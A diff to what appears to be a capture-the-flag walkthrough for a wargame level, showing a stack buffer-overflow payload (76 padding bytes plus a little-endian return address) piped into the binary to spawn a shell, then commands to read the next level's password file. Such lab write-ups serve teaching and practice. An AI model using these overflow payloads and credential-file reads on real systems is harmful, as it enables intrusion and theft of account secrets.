@@ -27,6 +27,7 @@
 	```
 
 4. **Analyze with Ghidra**
+
 	Main vulnerability:
 
 	```c
@@ -64,28 +65,16 @@
 	* Append the address of `run()` (in little-endian)
 
 	```bash
-	(head -c 76 < /dev/zero | tr '\0' 'A'; printf '\x4a\x84\x04\x08') | ./level1
+	(printf 'A%.0s' {1..76}; printf '\x44\x84\x04\x08\n'; cat) | ./level1
 	```
 
-7. **If needed, save to a file**
-
-	```bash
-	(head -c 76 < /dev/zero | tr '\0' 'A' > /tmp/payload; printf '\x44\x84\x04\x08') >> /tmp/payload
-	```
-
-8. **Trigger the exploit**
-
-	```bash
-	(cat /tmp/payload; cat) | ./level1
-	```
-
-9. **Try typing**
+7. **Try typing**
 
 	```bash
 	whoami
 	```
 
-10. **Read the password**
+8. **Read the password**
 
 	```bash
 	cat /home/user/level2/.pass
